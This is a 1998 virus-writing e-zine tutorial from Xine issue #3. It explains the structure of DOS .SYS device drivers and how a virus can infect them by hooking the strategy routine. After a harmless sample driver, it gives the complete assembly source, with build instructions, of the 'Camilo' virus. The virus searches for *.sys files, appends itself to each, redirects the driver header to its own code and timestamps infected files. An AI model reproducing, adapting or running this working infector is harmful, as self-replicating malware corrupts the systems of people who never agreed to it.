   ;
   ;                                         /-----------------------------\
   ;                                         | Xine - issue #3 - Phile 106 |
   ;                                         \-----------------------------/
   ;
   ;
   ;
   ;                     Little SYS Infection Tutorial
   ;                     ß ß ß ß ß ß ß ß ß ß ß ß ß ß ß
   ;                            ÜÛ by Int13h ÛÜ
   ;                               Ä Ä Ä Ä Ä
   ;
   ;
   ; Well,  here  we  will speak a bit about the infection of devices drivers, they
   ; are  really  very easy to infect. When finishing this reading you will be able
   ; to add infection of device drivers to your virus, then it will be more c00l :)
   ; A .SYS  phile,  that is, a device driver, is a bridge of communication between
   ; the software and hardware devices. The SYS philes are read from the CONFIG.SYS,
   ; they  are  loaded in an own segment without PSP and are originated at offset 0.
   ; They  can  be  block  or  character  devices. The structure of a device driver
   ; follows:
   ;
   ;                HEADER
   ;                STRATEGY ROUTINE
   ;                INTERRUPT ROUTINE
   ;
   ;
   ; The  first  part  of  a  .SYS  program  is  the  header,  which  structure is:
   ;
   ; Offset  Length    Description
   ; ------  ------    -----------
   ;  0       dd       32 bit pointer to next device driver header
   ;  4       dw       Attribute
   ;  6       dw       Pointer to strategy routine (offset)
   ;  8       dw       Pointer to interrupt routine (offset)
   ;  A       8 bytes  Name of the device
   ;
   ;
   ; The  first  field  is a 32 bit pointer to the device header of the next device,
   ; this  is  because  in  a  .SYS  file  can be concatenated various devices, and
   ; the  last  in  the  chain  has this relative offset of  his header filled with
   ; the  value  FFFF:FFFF.  The  attribute  word is used to identify if the driver
   ; is  a  character  device  or  a  block  one.  The  next field, has  the offset
   ; in   the  file  where  the  strategy  routine  is,  a  strategy  routine  must
   ; save  the  location  of  the  request  header  that  DOS  gives to it in ES:BX.
   ; The  next  field  must  hold  the  offset  of  the  interrupt  routine handler,
   ; which  is  the  really  working  horse of the device driver, it must interpret
   ; the  request  header  and  perform  the  commands  that  it  read  from  there.
   ; The  last  one,  is  a  8 bytes field that have the name of a character device
   ; or  the  number  of  units  of  a  block  device.  DOS  loads  device  drivers
   ; dynamically  at  boot  time,  reading  them  from the CONFIG.SYS, then a virus
   ; can  take  control  before  some  antiviruses.  You  could read more about SYS
   ; structure in the chapter 9 of  the  Programmer's Technical Reference for MSDOS
   ; and   the   IBM   PC,   a   very   nice   shareware  document  in  TXT  format.
   ;
   ; Just  as  an  example,  we  will  code  a  simple  SYS  file  which displays a
   ; message. Here it is:
   ;
   ;
   ; 8< - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
   ;
   ; SIMPLE SYS FILE, by Int13h
   ;
   ; Compile:
   ;       tasm /zi /m3 stupid.asm
   ;       tlink /m /v stupid.obj
   ;       tdstrip -c stupid.exe
   ;       ren stupid.com stupid.sys
   ;       Install stupid.sys with a DEVICE command in your CONFIG.SYS
   ;
   .model tiny
   .code
   org 0

   Silly_SYS:                      ; SYS Header
   Next_Device dd 0ffffffffh       ; Just one device
   Attribute   dw 8000h            ; Type: character device
   Strategy    dw offset Strategy_Routine
   Interrupt   dw offset Interrupt_Routine
   NameDevice  db 'SillySYS'


   Strategy_Routine:               ; Save ES:BX, address of the request header
           mov word ptr cs:[Request_Header],bx
           mov word ptr cs:[Request_Header+2],es
           retf


   Interrupt_Routine:              ; The hearth of the program
           push ds
           push cs
           pop ds                  ; DS=CS

           ; Here, we points ES:BX to the request header
           les bx,dword ptr ds:[Request_Header]
           mov al,byte ptr es:[bx+2] ; Take the command byte
           test al,al              ; Is 0? That means, initialization
           jnz Go_Out              ; Nope

           ; Here we set the segment and ending offset of the program
           ; and with a 100h we indicate to DOS that all was sucessfull
           mov word ptr es:[bx+03h],0100h
           mov word ptr es:[bx+0eh],offset Ending
           mov word ptr es:[bx+010h],cs

           ; Display a stupid msg
           mov cx,15
           mov si,offset Message
           lodsb
           mov ah,0eh
           xor bx,bx
           int 10h
           loop $-7

           pop ds
   Go_Out: sub ax,ax
           retf                    ; Return

           Request_Header dw 0,0   ; This will hold the address passed by DOS
           Message        db 'ABSURD WORLD!',13,10
           Ending:

   End Silly_SYS

   ; 8< - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
   ;
   ;
   ; Well.  As  you  can  see  it  is  simple  enough. Now, we will speak about the
   ; infection  matter.  A  virus  can  add  itself  to  the  end of file and point
   ; the  Next_Device  field  (offset 0)  of  the  header  to  itself, then it will
   ; be  acting  like  a  normal  program,  this  is  the  way  that  Dark Angel of
   ; Phalcom/Skim  has  choosed,  and  you  can  read  about  it  in  the  number 9
   ; of   40Hex   magazine.   For   our   infection  purposes,  we  will  hook  the
   ; strategy  routine.  This  is  the  routine  that  grabs  the  pointer  to  the
   ; request   header  (ES:BX)  then  you  must  be  careful  not  changing  these
   ; registers,  specially  with the garbage if you are making a polymorphic virus.
   ;
   ; Let's see:
   ;
   ; BEFORE INFECTION:
   ;                    > Header (Points to Strategy Routine)
   ;                    > Strategy Routine
   ;                    > Interrupt Routine
   ;
   ;
   ; AFTER INFECTION:
   ;                    > Header (Points to Virus)
   ;                    > Strategy Routine
   ;                    > Interrupt Routine
   ;                    > Virus
   ;
   ;
   ; In others words, we will follow the next algorithm:
   ;
   ;         1.) Open the SYS file.
   ;         2.) Read the header (10 bytes).
   ;         3.) Save in a buffer the original pointer to strategy routine.
   ;         4.) Move pointer to end of file (save AX value).
   ;         5.) Write virus there.
   ;         6.) Modify header, changing the pointer to the strategy routine
   ;             to the value in AX (file size), then it will point to virus.
   ;         7.) Move the pointer to the beginning.
   ;         8.) Write the modified header.
   ;        10.) Close the sucker.
   ;
   ;
   ;
   ; And that is all. For some comments I can be reached at Int13h@antisocial.com.
   ; Here,  as  example,  follows a  runtime appending SYS infector which works by
   ; the method of reapoiting the strategy routine. Have fun!
   ;
   ;
   ; 8< - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
   ; Camilo Virus by Int13h
   ;
   ; To assemble:
   ;           tasm camilo.asm /m3
   ;           tlink camilo
   ;
   ; Run  the program camilo.exe in a directory where there are some .SYS files.
   ; Generally it will hang after the infection of all the  .SYS this is because
   ; when it returns control to the original strategy it points to offset 0, but
   ; the  infected  .SYS  will  run  without  any  problem.  Install  one of the
   ; infected  device  drivers  in  your CONFIG.SYS as  DEVICE=infected.sys  and
   ; all  will  be ok.  The virus is very simple and easy to understand, this is
   ; a  tutorial,  remember? :)          Compile  under  TASM,  I  hate  A86! :)

   .model tiny
   .code
   jumps
   org 0

   VirusSize equ offset Heap-offset Camilo

   Camilo: db 0b8h                 ; mov ax,original strategy routine offset
           Vieja_Estrategica dw 0
           push ax                 ; Push the address, then we will jump with a RET

           push bx cx dx si di bp ds es

           push cs cs
           pop ds es               ; DS=CS

           call Delta
     Delta:pop di                  ; Get the delta offset
           sub di,offset Delta

           mov ah,02fh             ; Save original DTA
           int 021h
           mov word ptr [di+OriginalDTA],bx
           mov word ptr [di+OriginalDTA+2],es

           mov ah,01ah             ; Set an own DTA (points to heap)
           lea dx,[di+offset ViralDTA]
           int 021h

           mov ah,04eh             ; Look for all the .SYS files in the
           xor cx,cx               ; current directory
           lea dx,[di+offset Victims]
           int 021h
           jc PopThem

   Verify: mov ax,03d02h           ; Open the file found
           lea dx,[di+offset ViralDTA+01eh]
           int 021h
           xchg bx,ax

           mov ah,03fh             ; Read 10 bytes
           lea dx,[di+offset Buffer]
           mov cx,10d
           int 021h

           mov si,dx
           mov ax,word ptr [si]
           cmp ax,'ZM'             ; SYS with .EXE header?
           je Close
           inc ax                  ; Check if it header has the value 0xffff
           jnz Close               ; to see if is the only device in the file

           mov ax,05700h           ; Get date and time
           int 021h
           mov word ptr [di+Fecha],dx
           mov word ptr [di+Hora],cx
           and cl,00011111b
           cmp cl,00011110b        ; 30*2= 60?  Look 4 infection mark
           je Close

           mov ax,04202h           ; Move pointer to EOF
           sub cx,cx
           cwd
           int 021h

           mov cx,word ptr [si+6]  ; Store the original strategy routine
           mov word ptr [di+Vieja_Estrategica],cx
           ; Points strategy routine to virus code, at EOF (AX value)
           mov word ptr [di+offset buffer+6],ax

           mov ah,040h             ; Append virus to file
           mov cx,VirusSize
           lea dx,[di+offset Camilo]
           int 021h

           mov ax,04200h           ; Pointer to the beginning
           xor cx,cx
           cwd
           int 021h

           mov ah,040h             ; Write the modified header
           mov cx,10
           lea dx,[di+offset Buffer]
           int 021h

           mov ax,05701h           ; Restore date & time
           db 0bah
           Fecha dw 0
           db 0b9h
           Hora dw 0
           and cl,11100000b        ; Mark time as infected
           or cl,00011110b         ; Set seconds=30*2=60!
           int 021h

   Close:  mov ah,03eh             ; Close the sucker
           int 021h

           mov ah,04fh             ; Call the next victim
           int 021h
           jnc Verify

   PopThem:mov ah,01ah             ; Restore original DTA
           lds dword ptr dx,[di+offset OriginalDTA]
           int 021h

           pop es ds bp di si dx cx bx

           xor ax,ax
           ret                     ; Jump to the original strategy routine!

           Buffer    db 10 dup(0)  ; We will read the header here

           ; Dedicated to Camilo Jos‚ Cela, a genial novelist from Spain
           VirusName db ' [CAMILO by Int13h] '

           Victims   db '*.sys',0  ; Files to infect

           HEAP label byte         ; End of virus in the file
           OriginalDTA dd 0        ; Old DTA address
           ViralDTA db 43 dup (0)  ; To use it in Find first/next functions

   End Camilo
   8< - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8

                                                                        INT13H
                                                   Paraguay, February 13, 1998
